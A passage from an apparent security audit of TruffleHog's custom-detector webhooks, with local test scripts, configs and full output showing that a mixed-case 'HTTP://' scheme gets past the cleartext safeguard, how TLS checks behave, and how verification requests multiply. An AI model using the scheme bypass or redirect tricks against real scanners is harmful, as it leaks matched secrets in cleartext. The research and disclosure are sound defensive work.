HEADER: Host: 127.0.0.1:55771
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
```

**What the captures show (OBSERVED):**

- Exact lowercase **`http://`** without `unsafe` is correctly **REJECTED** at load (`http endpoint must have unsafe=true`), `SERVER_POSTS=0` — no request leaves the process.
- **`HTTP://`**, **`Http://`**, and **`hTtP://`** without `unsafe` are each **ACCEPTED** at load, produce a **verified** result, and dispatch exactly one POST (`SERVER_POSTS=1`).
- The focused capture confirms the bypassed request is genuine cleartext HTTP: a plaintext (non-TLS) server received a well-formed request whose body carries the synthetic secret and whose `Authorization` header is attached verbatim — with **no** `unsafe: true` anywhere in the config.

**Security significance.** The `unsafe` flag is the *only* thing standing between a config author and silent cleartext egress, and a one-character case change defeats it. Combined with the absence of any address filtering (§3.1–§3.3), an untrusted detector config can exfiltrate matched secrets in cleartext to any internal, RFC-1918, or link-local address **without** tripping the sole plaintext safeguard. Root cause is the case-sensitive comparison in `ValidateVerifyEndpoint` [validation.go:40]; a robust check would lower-case the scheme (or parse the URL and compare `url.Scheme`) before the prefix test. *(Recommendation only — no source change is made, per the read-only scope.)*

### 3.6 What this proves — and what it does not

**[SOURCE-DERIVED + CORROBORATED]** The experiment proves **address/path request reachability and secret-bearing `POST` egress**. It does **not** prove cloud-credential retrieval, and the document does not claim it does. Two distinctions matter:

- **Method/shape mismatch.** TruffleHog's verifier always issues a `POST` with a JSON body [custom_detectors.go:228]. Retrieving an AWS IAM credential document is a `GET`, and on IMDSv2 requires first a `PUT` to `/latest/api/token` to obtain a session token that must accompany subsequent `GET`s (see §10). A blind `POST` to the metadata path does not perform that flow, and the demonstrated URL carries no role-name resource.
- **Configuration acceptance vs. network reachability.** The load-time acceptance of the endpoint (a *configuration* fact, proven above) is separate from whether a given deployment's network actually routes to a metadata service. Real egress is still subject to URL parsing, DNS, routing, firewalls, proxies, transport/TLS outcomes, and server availability. The security-relevant, environment-independent fact is that **TruffleHog itself imposes no destination restriction and will place matched secrets into a POST aimed wherever the config author chooses.**

---

## 4. TLS / certificate validation (MITM exposure)

**Direct answer:** For **HTTPS** webhooks, TruffleHog performs Go's **default strict** certificate and hostname verification — an untrusted or mismatched certificate makes the handshake fail, the secret is **not** transmitted, and the result is reported **unverified**. There is no `InsecureSkipVerify` and no certificate pinning on this path, so a network MITM presenting an untrusted certificate cannot silently intercept an HTTPS webhook. This protection exists **only** for HTTPS: an `http://` endpoint (opted in with `unsafe: true`, §3.4) sends the secret in cleartext with no certificate protection at all.

### 4.1 The client and its TLS posture (code path)

**[SOURCE-DERIVED / INFERRED]** Custom detectors use a single shared client `var httpClient = common.SaneHttpClient()` [pkg/custom_detectors/custom_detectors.go:62]. `SaneHttpClient` builds its transport from `saneTransport`, which sets `Proxy: http.ProxyFromEnvironment` and a `DialContext`, but **sets no `TLSClientConfig`** [pkg/common/http.go:211-221]. When `TLSClientConfig` is nil, Go's `crypto/tls` uses the host root-CA set and enforces hostname verification (see §10). This is the default, non-overridden behavior — TruffleHog neither weakens it (no `InsecureSkipVerify: true`) nor hardens it here (the CA-pinning `PinnedRetryableHttpClient` [pkg/common/http.go:159-177] exists but is **not** used by custom detectors).

When the request errors — which a failed TLS handshake does — `createResults` executes `if err != nil { continue }` [custom_detectors.go:241-242], skipping the status/verified branch. The result therefore stays **unverified** (not "unknown"): the error is swallowed with no status downgrade to unknown and no surfaced message.

### 4.2 Evidence — untrusted cert blocks; same cert, trusted, succeeds

The self-signed certificate is generated once (in `01_build_env.sh`) with:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
  -days 2 -nodes -subj "/CN=127.0.0.1" -addext "subjectAltName=IP:127.0.0.1"
```

The scenario script (self-contained; sources `lib.sh` from §2.3):

```bash
# ---- scripts/03_tls.sh ----
#!/usr/bin/env bash
# Evidence: default strict TLS verification. Untrusted self-signed cert => the
# handshake fails BEFORE any HTTP request (0 server requests, secret NOT sent);
# the SAME cert trusted via SSL_CERT_FILE => verified and secret delivered.
source /tmp/th_harness/scripts/lib.sh
read P < <(pick_ports 1)
DATA="$TH/data_tls"; make_canon_data "$DATA"
CERTDIR="$TH/tls"
CFG="$TH/tls.yaml"
cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: https://127.0.0.1:$P/
        headers: ["$AUTH"]
CFG
echo "--- config (https endpoint, NO unsafe needed for https) ---"; cat "$CFG"

echo ""
echo "################ TLS A: UNTRUSTED self-signed cert (default system trust) ################"
L="$EV/tls_untrusted.log"; start_server "$P" 200 "$L" "" "" "$CERTDIR/cert.pem" "$CERTDIR/key.pem"
CLI="$EV/tls_untrusted_cli.out"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
echo "--- CLI result ---"; grep -E 'Found (verified|unverified) result|verified_secrets|unverified_secrets' "$CLI"
echo "--- x509 error surfaced in verbose log (if any) ---"; grep -oiE 'x509[^"]*|certificate[^"]*|tls: [^"]*' "$CLI" | head -3
echo "--- server request count (0 => handshake failed before HTTP write; secret NOT sent) ---"; posts "$L"
echo "--- server log (SERVER-READY only, no REQUEST) ---"; cat "$L"
stop_all

echo ""
echo "################ TLS B: SAME cert TRUSTED via SSL_CERT_FILE ################"
L="$EV/tls_trusted.log"; start_server "$P" 200 "$L" "" "" "$CERTDIR/cert.pem" "$CERTDIR/key.pem"
CLI="$EV/tls_trusted_cli.out"
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 SSL_CERT_FILE="$CERTDIR/cert.pem" \
  "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
echo "--- CLI result ---"; grep -E 'Found (verified|unverified) result|verified_secrets|unverified_secrets' "$CLI"
echo "--- server request count (1 => handshake ok, POST delivered over TLS) ---"; posts "$L"
echo "--- server-captured request (secret delivered over TLS) ---"; cat "$L"
stop_all
```

Complete, unedited output:

```text
--- config (https endpoint, NO unsafe needed for https) ---
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '[^A-Za-z0-9+\/]{0,1}([A-Za-z0-9+\/]{40})[^A-Za-z0-9+\/]{0,1}'
    verify:
      - endpoint: https://127.0.0.1:33985/
        headers: ["Authorization: super secret authorization header"]

################ TLS A: UNTRUSTED self-signed cert (default system trust) ################
readiness: connect_ex=0 (listening)
--- CLI result ---
Found unverified result 🐷🔑❓
2026-07-13T18:50:56Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "15.231659ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":10}}
--- x509 error surfaced in verbose log (if any) ---
--- server request count (0 => handshake failed before HTTP write; secret NOT sent) ---
0
0
--- server log (SERVER-READY only, no REQUEST) ---
SERVER-READY port=33985 status=200 redirect_to='' log='/tmp/th_harness/ev2/tls_untrusted.log' pid=115193

################ TLS B: SAME cert TRUSTED via SSL_CERT_FILE ################
readiness: connect_ex=0 (listening)
--- CLI result ---
✅ Found verified result 🐷🔑
2026-07-13T18:50:58Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "53.035906ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":48}}
--- server request count (1 => handshake ok, POST delivered over TLS) ---
1
--- server-captured request (secret delivered over TLS) ---
SERVER-READY port=33985 status=200 redirect_to='' log='/tmp/th_harness/ev2/tls_trusted.log' pid=115276
----- REQUEST #1 @ 2026-07-13T18:50:58 -----
REQUEST-LINE: POST / HTTP/1.1
HEADER: Host: 127.0.0.1:33985
HEADER: User-Agent: TruffleHog
HEADER: Content-Length: 121
HEADER: Authorization: super secret authorization header
HEADER: Accept-Encoding: gzip
BODY: {"HogTokenDetector":{"token":[" pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn\n","pOIAj9x47WT5qElx5JrI3e7O714HgaAIz2ck9sVn"]}}
----- END REQUEST #1 -----
```

**What the capture shows (OBSERVED):**
- **Untrusted (default system trust):** result is `Found unverified result`, `verified_secrets: 0`; the capture server logs **0** requests (`SERVER-READY` only, no `REQUEST`). The handshake fails *before* any HTTP write, so the secret **never leaves the client**.
- **Trusted (same cert via `SSL_CERT_FILE`):** result is `✅ Found verified result`, `verified_secrets: 1`; the server logs exactly **1** `POST /`, and the body carries the synthetic secret — delivered over TLS. The only variable changed between the two runs is whether the cert is trusted, isolating certificate validation as the deciding factor **in this controlled contrast**.

### 4.3 Evidence — hostname verification is enforced independently of CA trust (trusted CA, wrong SAN)

**[OBSERVED]** §4.2 shows that an *untrusted issuer* blocks the handshake. This experiment isolates the **other half** of Go's default verification — **hostname (SAN) matching** — by trusting the issuing CA and varying **only** the certificate's SAN. A leaf signed by a **trusted** CA but whose SAN does **not** include the dialed host (`127.0.0.1`) still fails the handshake, so the secret is never sent and the result is `unverified`. The same trusted CA with a **matching** SAN succeeds. This makes the "mismatched certificate" half of the §4 direct answer an OBSERVED fact rather than an assertion.

A throwaway CA and two leaf certificates are generated (one matching, one not), both signed by the same CA:

```bash
# local CA (trusted only via SSL_CERT_FILE below)
openssl req -x509 -newkey rsa:2048 -keyout ca-key.pem -out ca-cert.pem -days 2 -nodes \
  -subj "/CN=TH-Test-Local-CA" \
  -addext "basicConstraints=critical,CA:TRUE" -addext "keyUsage=critical,keyCertSign,cRLSign"
# GOOD leaf: SAN IP:127.0.0.1 (matches the dialed host)
openssl req -newkey rsa:2048 -keyout good-key.pem -out good.csr -nodes -subj "/CN=127.0.0.1"
openssl x509 -req -in good.csr -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -days 2 \
  -extfile <(printf "subjectAltName=IP:127.0.0.1\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth") \
  -out good-cert.pem
# WRONG leaf: SAN does NOT include 127.0.0.1 — same trusted CA
openssl req -newkey rsa:2048 -keyout wrong-key.pem -out wrong.csr -nodes -subj "/CN=wrong.invalid"
openssl x509 -req -in wrong.csr -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -days 2 \
  -extfile <(printf "subjectAltName=DNS:wrong.invalid,IP:10.99.99.99\nbasicConstraints=CA:FALSE\nextendedKeyUsage=serverAuth") \
  -out wrong-cert.pem
```

Both leaves chain to the CA (`openssl verify -CAfile ca-cert.pem <leaf>` → `OK` for each); only the SAN differs. Scenario script (self-contained; sources `lib.sh` from §2.3):

```bash
# ---- scripts/11_tls_hostname.sh ----
#!/usr/bin/env bash
# Evidence: Go's default TLS verification (SaneHttpClient sets no TLSClientConfig,
# common/http.go:223-229) enforces HOSTNAME verification INDEPENDENTLY of CA trust.
# A leaf signed by a TRUSTED CA but with a SAN that does NOT match the dialed host
# (127.0.0.1) still fails the handshake -> 0 server requests, secret NOT sent,
# result unverified. The SAME trusted CA with a CORRECT SAN succeeds.
source /tmp/th_harness/scripts/lib.sh
CA=/tmp/th_harness/tls_ca
DATA="$TH/data_tlsh"; make_canon_data "$DATA"

run_case() {  # run_case LABEL CERT KEY
  local label="$1" cert="$2" key="$3"
  read P < <(pick_ports 1)
  local L="$EV/tlsh_${label}.log"
  start_server "$P" 200 "$L" "" "" "$cert" "$key" >/dev/null
  local CFG="$TH/tlsh_${label}.yaml"
  cat > "$CFG" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: https://127.0.0.1:$P/
        headers: ["$AUTH"]
CFG
  echo "################ $label ################"
  echo "server leaf SAN: $(openssl x509 -in "$cert" -noout -ext subjectAltName | tail -1 | sed 's/^ *//')"
  local CLI="$EV/tlsh_${label}_cli.out" n
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 SSL_CERT_FILE="$CA/ca-cert.pem" \
    "$BIN" filesystem "$DATA" --config="$CFG" --no-update >"$CLI" 2>&1
  echo "RESULT: $(grep -E 'Found (verified|unverified) result' "$CLI" | head -1)"
  grep -E '"verified_secrets"' "$CLI" | sed -E 's/.*("verified_secrets"[^,]*, "unverified_secrets"[^}]*).*/\1/' | head -1
  n=$(grep -c '^REQUEST-LINE' "$L" 2>/dev/null); n=${n:-0}
  echo "SERVER_POSTS=$n  (0 => handshake failed before HTTP write; secret NOT sent)"
  stop_all >/dev/null 2>&1
  echo ""
}

echo "CA (trusted via SSL_CERT_FILE): $(openssl x509 -in "$CA/ca-cert.pem" -noout -subject | sed 's/^subject=//')"
echo "Both leaves are signed by that CA (openssl verify OK); only the SAN differs."
echo ""
run_case "TRUSTED_CA_WRONG_SAN" "$CA/wrong-cert.pem" "$CA/wrong-key.pem"
run_case "TRUSTED_CA_CORRECT_SAN" "$CA/good-cert.pem" "$CA/good-key.pem"
```

Complete, unedited output:

```text
CA (trusted via SSL_CERT_FILE): CN=TH-Test-Local-CA
Both leaves are signed by that CA (openssl verify OK); only the SAN differs.

################ TRUSTED_CA_WRONG_SAN ################
server leaf SAN: DNS:wrong.invalid, IP Address:10.99.99.99
RESULT: Found unverified result 🐷🔑❓
"verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "15.283268ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":9
SERVER_POSTS=0  (0 => handshake failed before HTTP write; secret NOT sent)

################ TRUSTED_CA_CORRECT_SAN ################
server leaf SAN: IP Address:127.0.0.1
RESULT: ✅ Found verified result 🐷🔑
"verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "55.395691ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":50
SERVER_POSTS=1  (0 => handshake failed before HTTP write; secret NOT sent)
```

Because TruffleHog swallows the transport error (§4.4), an out-of-band `curl` against the **same** wrong-SAN server (CA trusted) reveals **why** the handshake fails — this is a diagnostic, **not** a TruffleHog observation:

```text
$ curl -sS --cacert ca-cert.pem https://127.0.0.1:<wrong-san-port>/
curl: (60) SSL: no alternative certificate subject name matches target ipv4 address '127.0.0.1'
```

**What the captures show (OBSERVED):**
- **Trusted CA + wrong SAN:** `Found unverified result`, `verified_secrets: 0`, `SERVER_POSTS=0` — hostname verification fails even though the issuer is trusted; the secret never leaves the client.
- **Trusted CA + matching SAN:** `✅ Found verified result`, `verified_secrets: 1`, `SERVER_POSTS=1` — the only changed variable is the SAN, isolating **hostname** verification as the deciding factor. The `curl` diagnostic confirms the mechanism is specifically a SAN/host mismatch (`no alternative certificate subject name matches target ... '127.0.0.1'`).

### 4.4 Edge case — the TLS error is swallowed even at maximum verbosity

Re-running the untrusted case at trace level (`--log-level=5`, the highest verbosity the CLI offers) confirms the error is fully swallowed by `if err != nil { continue }` — no `x509`/`certificate`/`tls`/`handshake` text is emitted at any log level, and the server still receives nothing. The full trace is **154 lines** (149 of them identical per-worker "finished scanning chunks" boilerplate); rather than embed it verbatim, the filtering commands below extract **every** security-relevant line in full — each filtering command is shown with its complete output, and the complete raw trace is preserved on disk (§14):

```text
# Untrusted-cert TLS at MAX verbosity (--log-level=5). Each command below
# is shown with its COMPLETE, unedited output. The raw CLI log is 154 lines,
# of which 149 are identical-format per-worker "finished scanning chunks"
# trace lines; the commands here extract every security-relevant line in full.

$ wc -l tls_untrusted_trace_cli.out
154 tls_untrusted_trace_cli.out

$ grep -E "Found (verified|unverified) result" tls_untrusted_trace_cli.out
Found unverified result 🐷🔑❓

$ grep "\"unverified_secrets\"" tls_untrusted_trace_cli.out   # the finished-scanning summary (complete line)
2026-07-13T19:04:46Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 0, "unverified_secrets": 1, "scan_duration": "15.099538ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":9}}

$ grep -ciE "x509|certificate|tls:|handshake" tls_untrusted_trace_cli.out   # count of any TLS-error text, even at trace
0

$ grep -c "^REQUEST-LINE:" tls_untrusted_trace.log   # server-side requests received (0 => secret never left the client)
0
```

### 4.5 Scope and caveats (qualifications)

- **"Unverified", not "unknown".** Because the transport error is swallowed with `continue` [custom_detectors.go:241-242], a TLS failure yields an **unverified** result. TruffleHog's three-state model reserves "unknown" for verifiers that explicitly signal indeterminacy; a swallowed handshake error is not one of them.
- **The contrast isolates cert-trust in this environment.** The trusted/untrusted runs differ only in whether the certificate is trusted, which is why cert validation is the deciding factor **here**. This is a statement about the observed controlled contrast, not a claim that certificate trust is the *sole* factor in every possible deployment (routing, proxies, SNI, cipher policy, and server availability also affect real handshakes).
- **HTTPS only.** This certificate protection applies to `https://` endpoints. The `unsafe: true` + `http://` path (§3.4) transmits the identical secret-bearing body in **cleartext**, where no certificate check applies and any on-path observer can read it — a strictly weaker posture that a config author can select.

---

## 5. Verification amplification

**Direct answer:** One verification request is dispatched **per match permutation**, and the cap `maxTotalMatches = 100` is applied **per keyword-match region** — i.e. per `FromData` invocation — **not** per engine chunk and **not** scan-wide. The engine calls `FromData` once for each merged keyword-match region in a chunk [pkg/engine/engine.go:1061-1070], and the 100 clamp bounds the permutations *within one such call*; a single chunk that contains several non-merging regions therefore issues **more than 100** verifications (observed: one 8241-byte chunk with two regions → **120** POSTs). The total scales further with the number of chunks (observed: two 150-match files → two chunks → 200 POSTs), and is multiplied by **multiple verifiers** (each permutation is offered to every configured verifier until one returns 200) and by **HTTP redirects** (each followed hop is an additional request that replays the secret-bearing body).

### 5.1 Code path (per-region cap, per-permutation dispatch)

**[SOURCE-DERIVED / INFERRED]**
- `const maxTotalMatches = 100` [pkg/custom_detectors/custom_detectors.go:23]; the doc-comment (lines 20-22) reads "maximum number of matches from one chunk", but at runtime the clamp is applied inside a single `FromData` call — see below — so it bounds one **keyword-match region**, not a whole engine chunk.
- The engine drives detection **per region, not per chunk**: `detectChunk` reads `matches := data.detector.Matches()` and loops `for _, matchBytes := range matches`, calling `e.verificationCache.FromData(…, matchBytes)` **once for each element** [pkg/engine/engine.go:1061-1070]. Each element is one merged keyword-match region, so a chunk containing K non-merging regions results in K independent `FromData` calls.
- Regions are formed by the Aho-Corasick core: each keyword hit yields a span `[kwIdx − 512, kwIdx + MaxSecretSize()]` (default offset radius 512 [pkg/engine/ahocorasick/ahocorasickcore.go:155]; `CustomRegexWebhook.MaxSecretSize()` returns 1000 [custom_detectors.go:180]), and `mergeMatches` merges only spans that overlap or are adjacent — `if d.matchSpans[i].startOffset <= current.endOffset` [pkg/engine/ahocorasick/ahocorasickcore.go:196-216]. Two keyword clusters separated by more than ~1512 bytes of keyword-free data therefore stay in **separate** regions inside the same chunk.
- `FromData` builds the cartesian product of per-regex matches via `permutateMatches` [custom_detectors.go:110]; the results channel is buffered at `maxTotalMatches` [custom_detectors.go:115]; `productIndices` clamps the permutation count with `if count > maxTotalMatches { count = maxTotalMatches }` [custom_detectors.go:295-296] — i.e. the clamp bounds permutations **within one region**.
- One goroutine per permutation is launched (`g.Go → createResults`) [custom_detectors.go:155-156].
- Inside `createResults`, **every** configured verifier is tried in order — `for _, verifyConfig := range c.GetVerify()` [custom_detectors.go:223] — and the loop only `break`s after the **first** endpoint returns 200 [custom_detectors.go:268]; a non-200 falls through to the next verifier. There is no custom `CheckRedirect`, so `net/http`'s default redirect policy applies (see §10, corroborated).

Because the clamp lives inside `FromData`, which the engine invokes **once per keyword-match region**, the real bound is `min(product_of_per-regex_match_counts, 100)` **per region**. A single chunk with R non-merging regions can therefore issue up to `100 × R` verifications, and a whole scan issues the sum of that across all chunks, further multiplied by the number of configured verifiers and by followed redirects. This corrects the earlier "100 per chunk / 100 × N chunks" framing (which had also treated the "exactly one POST per permutation" dispatch as the *complete* cap story — the per-permutation dispatch itself is accurate, but 100 bounds permutations **per region**, not per chunk): the datapoints below confirm a **single chunk exceeding 100**.

### 5.2 Scenario script (self-contained; sources `lib.sh` from §2.3)

```bash
# ---- scripts/05_amplification.sh ----
#!/usr/bin/env bash
# Evidence: verification is dispatched PER MATCH PERMUTATION, capped PER KEYWORD-MATCH
# REGION at maxTotalMatches=100 (custom_detectors.go:23) — NOT per chunk, NOT scan-wide
# (a single chunk with multiple non-merging regions exceeds 100). Plus multi-verifier
# fan-out, HTTP 308 redirect body-replay, and the successRanges no-op.
source /tmp/th_harness/scripts/lib.sh
read P Q R < <(pick_ports 3)

gen() { python3 -c "
import sys
n=int(sys.argv[1])
for i in range(n):
    print('hog token: '+('%040d'%i))   # distinct 40-char tokens, all match the regex
" "$1"; }

mkcfg1() {  # mkcfg1 FILE PORT
  cat > "$1" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$2/
        unsafe: true
        headers: ["$AUTH"]
CFG
}

run_amp() {  # run_amp TAG TARGET
  local tag="$1" target="$2" L="$EV/amp_$1.log" CLI="$EV/amp_$1_cli.out"
  start_server "$P" 200 "$L"
  local CFG="$TH/amp_$1.yaml"; mkcfg1 "$CFG" "$P"
  env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$target" --config="$CFG" --no-update >"$CLI" 2>&1
  local ch vs sp
  ch=$(grep -oE '"chunks": [0-9]+' "$CLI" | grep -oE '[0-9]+' | tail -1)
  vs=$(grep -oE '"verified_secrets": [0-9]+' "$CLI" | grep -oE '[0-9]+' | tail -1)
  sp=$(posts "$L")
  echo "[$tag] chunks=$ch verified_secrets=$vs SERVER_POSTS=$sp"
  stop_all
}

AMP="$TH/amp"; rm -rf "$AMP"; mkdir -p "$AMP/n10" "$AMP/n150" "$AMP/multi"
gen 10  > "$AMP/n10/data.txt"
gen 150 > "$AMP/n150/data.txt"
gen 150 > "$AMP/multi/fileA.txt"
gen 150 > "$AMP/multi/fileB.txt"

echo "################ AMPLIFICATION: POST count vs #matches (per-permutation dispatch; clamp per region) ################"
run_amp n10_single       "$AMP/n10"
run_amp n150_single_run1 "$AMP/n150"
run_amp n150_single_run2 "$AMP/n150"
run_amp multi_2x150      "$AMP/multi"
echo "(n10 => 10 linear; n150 => 100 = one dense region clamped; multi 2 files => 2 chunks => 200; single-chunk >100 shown in the REGION CAP block below)"

# --- REGION cap: a SINGLE chunk with non-merging regions exceeds 100 ---
# gen_split writes ONE file: an A-line cluster, GAP bytes of inert, keyword-free
# filler (dots — NOT in [A-Za-z0-9+/], so they never match the token regex),
# then a B-line cluster. Because the two keyword clusters are >1512 B apart,
# their [kw-512, kw+1000] spans do NOT merge (ahocorasickcore.go:196-216), so the
# engine emits TWO regions -> TWO FromData calls -> the 100 clamp applies to EACH.
gen_split() {  # gen_split A GAP B FILE
  python3 -c "
import sys
a,gap,b,path=int(sys.argv[1]),int(sys.argv[2]),int(sys.argv[3]),sys.argv[4]
def L(i): return 'hog token: '+('%040d'%i)+'\n'
with open(path,'w') as f:
    i=0
    for _ in range(a): f.write(L(i)); i+=1
    f.write('.'*gap+'\n')            # inert, keyword-free gap (dots never match the token regex)
    for _ in range(b): f.write(L(i)); i+=1
" "$1" "$2" "$3" "$4"; }

mkdir -p "$AMP/region"
gen_split 60  2000 60 "$AMP/region/split_60_60.txt"   # two 60-token regions     -> 120
gen_split 130 2000 20 "$AMP/region/a130_b20.txt"      # region A 130->100 + B 20  -> 120
gen_split 101 2000  1 "$AMP/region/a101_b1.txt"       # region A 101->100 + B 1   -> 101
gen 120             > "$AMP/region/merged_120.txt"    # control: 1 dense region   -> 100 (capped)

echo ""
echo "################ REGION CAP: ONE chunk, multiple non-merging regions (>100) ################"
run_amp region_split_60_60       "$AMP/region/split_60_60.txt"
run_amp region_a130_b20          "$AMP/region/a130_b20.txt"
run_amp region_a101_b1           "$AMP/region/a101_b1.txt"
run_amp region_merged_120_ctrl   "$AMP/region/merged_120.txt"
run_amp region_split_60_60_rerun "$AMP/region/split_60_60.txt"
echo "(split 60+60 => 120 in ONE chunk; a130_b20 => 100-clamped + 20 = 120; a101_b1 => 101; merged 120 gap0 => 100)"

echo ""
echo "################ MULTI-VERIFIER FAN-OUT: verify[0]=403 then verify[1]=200 ################"
DATA="$TH/data_amp1"; make_canon_data "$DATA"
LA="$EV/mv_A403.log"; LB="$EV/mv_B200.log"
start_server "$Q" 403 "$LA"; start_server "$R" 200 "$LB"
CFGMV="$TH/multiverifier.yaml"
cat > "$CFGMV" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$Q/first
        unsafe: true
        headers: ["$AUTH"]
      - endpoint: http://127.0.0.1:$R/second
        unsafe: true
        headers: ["$AUTH"]
CFG
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFGMV" --no-update 2>&1 \
  | grep -E 'Found (verified|unverified) result|verified_secrets'
echo "verifier[0] (:$Q) posts=$(posts "$LA") -> $(grep -m1 'REQUEST-LINE' "$LA")"
echo "verifier[1] (:$R) posts=$(posts "$LB") -> $(grep -m1 'REQUEST-LINE' "$LB")"
echo "(secret sent to BOTH endpoints; verified from the second's 200)"
stop_all

echo ""
echo "################ REDIRECT (HTTP 308) body replay to new destination ################"
LH1="$EV/redir_hop1.log"; LH2="$EV/redir_hop2.log"
start_server "$R" 200 "$LH2"                                   # hop2 = final target
start_server "$Q" 308 "$LH1" "" "http://127.0.0.1:$R/dest"      # hop1 = 308 -> hop2
CFGRD="$TH/redirect.yaml"
cat > "$CFGRD" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$Q/start
        unsafe: true
        headers: ["$AUTH"]
CFG
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFGRD" --no-update 2>&1 \
  | grep -E 'Found (verified|unverified) result|verified_secrets'
echo "--- HOP1 (:$Q redirector) ---"; cat "$LH1"
echo "--- HOP2 (:$R redirect target) — POST body + Authorization replayed? ---"; cat "$LH2"
stop_all

echo ""
echo "################ successRanges NO-OP: 403 + successRanges:['403'] -> still Unverified ################"
LS="$EV/successranges.log"; start_server "$Q" 403 "$LS"
CFGSR="$TH/successranges.yaml"
cat > "$CFGSR" <<CFG
detectors:
  - name: HogTokenDetector
    keywords: [hog]
    regex:
      token: '$REGEX'
    verify:
      - endpoint: http://127.0.0.1:$Q/only
        unsafe: true
        successRanges: ["403"]
        headers: ["$AUTH"]
CFG
env NO_PROXY=127.0.0.1 no_proxy=127.0.0.1 "$BIN" filesystem "$DATA" --config="$CFGSR" --no-update 2>&1 \
  | grep -E 'Found (verified|unverified) result|verified_secrets|unverified_secrets'
echo "server posts=$(posts "$LS") (403 returned; successRanges:['403'] configured but IGNORED by code)"
stop_all
```

### 5.3 Complete, unedited output

```text
################ AMPLIFICATION: POST count vs #matches (per-permutation dispatch; clamp per region) ################
readiness: connect_ex=0 (listening)
[n10_single] chunks=1 verified_secrets=10 SERVER_POSTS=10
readiness: connect_ex=0 (listening)
[n150_single_run1] chunks=1 verified_secrets=100 SERVER_POSTS=100
readiness: connect_ex=0 (listening)
[n150_single_run2] chunks=1 verified_secrets=100 SERVER_POSTS=100
readiness: connect_ex=0 (listening)
[multi_2x150] chunks=2 verified_secrets=200 SERVER_POSTS=200
(n10 => 10 linear; n150 => 100 = one dense region clamped; multi 2 files => 2 chunks => 200; single-chunk >100 shown in the REGION CAP block below)

################ REGION CAP: ONE chunk, multiple non-merging regions (>100) ################
readiness: connect_ex=0 (listening)
[region_split_60_60] chunks=1 verified_secrets=120 SERVER_POSTS=120
readiness: connect_ex=0 (listening)
[region_a130_b20] chunks=1 verified_secrets=120 SERVER_POSTS=120
readiness: connect_ex=0 (listening)
[region_a101_b1] chunks=1 verified_secrets=101 SERVER_POSTS=101
readiness: connect_ex=0 (listening)
[region_merged_120_ctrl] chunks=1 verified_secrets=100 SERVER_POSTS=100
readiness: connect_ex=0 (listening)
[region_split_60_60_rerun] chunks=1 verified_secrets=120 SERVER_POSTS=120
(split 60+60 => 120 in ONE chunk; a130_b20 => 100-clamped + 20 = 120; a101_b1 => 101; merged 120 gap0 => 100)

################ DECISIVE: full "finished scanning" telemetry for split_60_60 (single chunk) ################
readiness: connect_ex=0 (listening)
2026-07-13T22:03:39Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 8241, "verified_secrets": 120, "unverified_secrets": 0, "scan_duration": "11.874525473s", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":4,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":12276}}
SERVER_POSTS=120

################ MULTI-VERIFIER FAN-OUT: verify[0]=403 then verify[1]=200 ################
readiness: connect_ex=0 (listening)
readiness: connect_ex=0 (listening)
✅ Found verified result 🐷🔑
2026-07-13T18:52:35Z	info-0	trufflehog	finished scanning	{"chunks": 1, "bytes": 62, "verified_secrets": 1, "unverified_secrets": 0, "scan_duration": "7.177674ms", "trufflehog_version": "dev", "verification_caching": {"Hits":0,"Misses":1,"HitsWasted":0,"AttemptsSaved":0,"VerificationTimeSpentMS":2}}
